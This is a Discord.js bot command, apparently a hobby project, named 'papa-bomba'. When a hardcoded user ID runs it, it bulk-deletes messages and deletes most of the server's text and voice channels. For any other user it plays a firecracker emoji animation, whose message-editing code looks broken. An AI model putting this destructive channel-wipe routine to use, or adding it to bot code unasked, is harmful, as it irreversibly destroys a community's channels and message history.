const Discord = require('discord.js'); //Integrar discord.js
var global = require('../../config.json'); //Variables globales

async function deleteChannels(server) {
	await server.channels.filter(ch => ch.type === 'voice').deleteAll();
	server.channels.filter(ch => ch.calculatedPosition !== 0).deleteAll();
}

async function stupidBomb(animPos, mid, mch) {
	const msg = mch.fetchMessage(mid);
	if(animPos === 0)
		mch.send(':firecracker: :part_alternation_mark: :part_alternation_mark: :part_alternation_mark: :part_alternation_mark:')
			.then(sent => mid = sent.id);
	else if(animPos === 1)//{mch.send(msg.content);
		msg.edit(':firecracker: :part_alternation_mark: :part_alternation_mark: :part_alternation_mark: :part_alternation_mark: :candle:');
	else if(animPos >= 2 && animPos <= 5) {
		let animStr = ':firecracker: ';
		for(let i = 0; i < (4 - (animPos - 1)); i++) animStr += ':part_alternation_mark: ';
		animStr += ':fire:';
		msg.edit(animStr);
	}
	else if(animPos === 6) msg.edit(':yellow_square:');
	else if(animPos === 7) msg.edit(':yellow_circle:');
	else if(animPos === 8) msg.edit(':small_orange_diamond:');
	else if(animPos === 9) msg.edit(':high_brightness:');
	else if(animPos === 10) msg.edit(':low_brightness:');
	else if(animPos === 11) msg.edit(':eight_pointed_black_star:');

	if(animPos < 10) setTimeout(stupidBomb, 1000, animPos + 1, mid, mch);
}

module.exports = {
	name: 'papa-bomba',
	execute(message, args) {
        if(message.author.id === '423129757954211880') {
			const sv = message.channel.guild;
			sv.channels.filter(ch => ch.calculatedPosition === 0).tap(ch => {
				if(ch.type === 'text') {
					ch.bulkDelete(100, true);
					ch.send('*Todo lo que comienza, eventualmente termina. Sea por la razón que sea.*');
				}
			});
			
			deleteChannels(sv);
        } else {
            stupidBomb(0, message.id, message.channel);
            return;
        }
    },
};